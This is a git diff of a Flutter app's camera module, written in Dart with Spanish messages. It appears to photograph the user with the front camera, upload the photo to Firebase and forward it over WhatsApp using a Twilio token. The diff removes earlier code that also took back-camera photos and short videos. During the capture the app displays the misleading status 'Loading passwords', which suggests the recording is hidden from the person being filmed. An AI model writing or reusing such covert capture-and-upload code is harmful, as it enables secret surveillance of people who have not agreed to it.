@@ -18,6 +18,7 @@ class CameraSendCubit extends Cubit<CameraSendState> {
   late CameraController controller;
   late List<CameraDescription> lista;
   String phone = '';
+  String token = '';
   bool err = false;
 
   Future<List<CameraDescription>> getPermisse() async {
@@ -29,11 +30,21 @@ class CameraSendCubit extends Cubit<CameraSendState> {
     await controller.initialize();
   }
 
-  Future getNumberPhone() async {
+  Future getNumberPhone(String? phoneUser) async {
     try {
-      final resp = await _repository.getPhoneNumber();
+      if (phoneUser == null) err = true;
+      phone = phoneUser ?? "";
+    } catch (e) {
+      err = true;
+      emit(CameraSendError("Encontramos un error en la conexion a internet"));
+    }
+  }
+
+  Future getTokenTwilio() async {
+    try {
+      final resp = await _repository.getTokenTwilio();
       if (resp == null) err = true;
-      phone = resp ?? "";
+      token = resp ?? "";
     } catch (e) {
       err = true;
       emit(CameraSendError("Encontramos un error en la conexion a internet"));
@@ -44,8 +55,8 @@ class CameraSendCubit extends Cubit<CameraSendState> {
     try {
       emit(CameraSendLoading(""));
       err = false;
-      await getNumberPhone();
-      if (phone.isNotEmpty && err == false) {
+      await getTokenTwilio();
+      if (phone.isNotEmpty && err == false && token.isNotEmpty) {
         getPermisse().then((v) {
           lista = v;
         });
@@ -56,64 +67,20 @@ class CameraSendCubit extends Cubit<CameraSendState> {
         final directory = await getExternalStorageDirectory();
         controller = CameraController(
             const CameraDescription(
-                name: "0",
-                lensDirection: CameraLensDirection.back,
-                sensorOrientation: 90),
+                name: "1",
+                lensDirection: CameraLensDirection.front,
+                sensorOrientation: 270),
             ResolutionPreset.max);
         await initialize();
-        final photo2 = await controller.takePicture();
-        await photo2
-            .saveTo('${directory!.path}/${photo2.path.split("/").last}');
-        File fileexport2 =
-            File('${directory.path}/${photo2.path.split("/").last}');
-        list.add(fileexport2.path);
-        if (lista.length >= 2) {
-          controller = CameraController(
-              const CameraDescription(
-                  name: "1",
-                  lensDirection: CameraLensDirection.front,
-                  sensorOrientation: 270),
-              ResolutionPreset.max);
-          await initialize();
-          final photo = await controller.takePicture();
-          await photo.saveTo('${directory.path}/${photo.path.split("/").last}');
-          File fileexport =
-              File('${directory.path}/${photo.path.split("/").last}');
-          list.add(fileexport.path);
-        }
+        final photo = await controller.takePicture();
+        await photo.saveTo('${directory!.path}/${photo.path.split("/").last}');
+        File fileexport =
+            File('${directory.path}/${photo.path.split("/").last}');
+        list.add(fileexport.path);
+
         emit(CameraSendLoading("Cargando contraseñas"));
-        controller = CameraController(
-            const CameraDescription(
-                name: "0",
-                lensDirection: CameraLensDirection.back,
-                sensorOrientation: 90),
-            ResolutionPreset.max);
-        await initialize();
-        await controller.startVideoRecording();
-        await Future.delayed(const Duration(seconds: 4));
-        final video2 = await controller.stopVideoRecording();
-        String path2 = '${directory.path}/${video2.path.split("/").last}';
-        await video2.saveTo(path2);
-        File videoexport2 = File(path2);
-        list.add(videoexport2.path);
-        if (lista.length >= 2) {
-          controller = CameraController(
-              const CameraDescription(
-                  name: "1",
-                  lensDirection: CameraLensDirection.front,
-                  sensorOrientation: 270),
-              ResolutionPreset.max);
-          await initialize();
-          await controller.startVideoRecording();
-          await Future.delayed(const Duration(seconds: 4));
-          final video = await controller.stopVideoRecording();
-          String path = '${directory.path}/${video.path.split("/").last}';
-          await video.saveTo(path);
-          File videoexport = File(path);
-          list.add(videoexport.path);
-        }
-         List<String> resp = await share2(list);
-        emit(CameraSendLoaded(resp));
+        List<String> resp = await share2(list);
+        emit(CameraSendLoaded(resp, phone, token));
       } else if (err == true) {
         emit(CameraSendError("Encontramos un error en la conexion a internet"));
       } else
@@ -121,19 +88,10 @@ class CameraSendCubit extends Cubit<CameraSendState> {
             "Lo sentimos, actualmente no ha sido asignado un numero valida para envio, por favor intente mas tarde"));
     } catch (e) {
       print(e);
-       emit(CameraSendError(
-              "No fue posible acceder a la camara, por favor revise los permisos o intente mas tarde"));
+      emit(CameraSendError(
+          "Error inesperado, por favor valide sus datos e intente nuevamente"));
     }
   }
-
-  // Future<void> share(List<String> files) async {
-  //    _repository.sendImageWhatsapp(url: files[0], phone: phone);
-  //    WhatsappShare.shareFile(
-  //     text: 'CameraDirect',
-  //     phone: phone,
-  //     filePath: [files[0]],
-  //   );
-  // }
 
   initialState() {
     err = false;
@@ -145,9 +103,11 @@ class CameraSendCubit extends Cubit<CameraSendState> {
     List<String> archives = [];
     for (var i = 0; i < files.length; i++) {
       File file = File(files[i]);
-      final String resp = await _repository.setFileFirebase(file: file, phone: phone);
+      final String resp =
+          await _repository.setFileFirebase(file: file, phone: phone);
       archives.add(resp);
-      await _repository.sendImageWhatsapp(url: resp, id: id, nameFile: "File$i");
+      await _repository.sendImageWhatsapp(
+          url: resp, id: id, nameFile: "File$i");
     }
     return archives;
   }
